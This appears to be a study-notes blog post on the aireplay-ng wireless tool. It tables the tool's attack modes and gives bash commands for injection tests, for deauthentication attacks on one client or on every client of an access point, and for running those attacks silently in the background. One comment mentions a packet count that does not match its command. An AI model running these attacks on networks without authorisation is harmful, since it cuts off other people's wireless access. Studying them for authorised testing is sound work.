---
description: >-
  Aireplay-ng (Generate-Traffic)
title:  Aireplay-ng (Generate-Traffic)       # Add title here
date: 2023-09-26 08:00:00 -0600                           # Change the date to match completion date
categories: [18 Wireless, Aircrack Suite]                     # Change Templates to Writeup
tags: [wireless, aireplay-ng]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

### Aireplay-ng 

Aireplay-ng is primarily useful for generating wireless traffic.

Aireplay-ng supports the following attacks. They are listed along with the corresponding number from the tool's documentation.


|ATTACK |	ATTACK NAME |
|--------|-------|
| 0	| Deauthentication |
| 1	| Fake Authentication |
| 2	| Interactive Packet Replay |
| 3	| ARP Request Replay Attack |
| 4	| KoreK ChopChop Attack |
| 5	| Fragmentation Attack |
| 6	| Café-Latte Attack |
| 7	| Client-Oriented Fragmentation Attack |
| 8	| WPA Migration Mode Attack |
| 9	| Injection Test |


```bash
# check if we can inject in visible APs. The injection test measures ping response times to the AP
sudo aireplay-ng -9 wlan0mon 

# check if we can inject in a specific AP
sudo aireplay-ng -e <ap_name> -a <MAC> wlan0mon

# deauth a client (1000000 is a large number of packets, to keep the deauth attack working for a while):
sudo aireplay-ng --deauth 4 -a <bssid> -c <client_MAC> wlan0mon

# To background the command and don't see output
sudo aireplay-ng --deauth 4 -a <bssid> -c <client_MAC> wlan0mon &> /dev/null &

# with "jobs" we can see the jobs backgrounded with &. each has an ID
jobs

# kill all backgrounded aireplay processes.
killall aireplay-ng 

# kill only the first process in the "jobs" list:
kill %1

# To deauth every client connected to a BSSID don't specify a client <MAC>
aireplay-ng --deauth 4 -a <bssid> wlan0mon &> /dev/null &

# Same as above, but without expecting to receive probes
sudo aireplay-ng -e <ap_name> -a <MAC> -D wlan0mon

# if we have two wifi cards, wlan0mon and wlan1mon, card-to-card test, to make sure they can inject. if it says (5/7 error, still can be used to attack an AP)
sudo aireplay-ng -9 -i wlan1mon wlan0mon

```
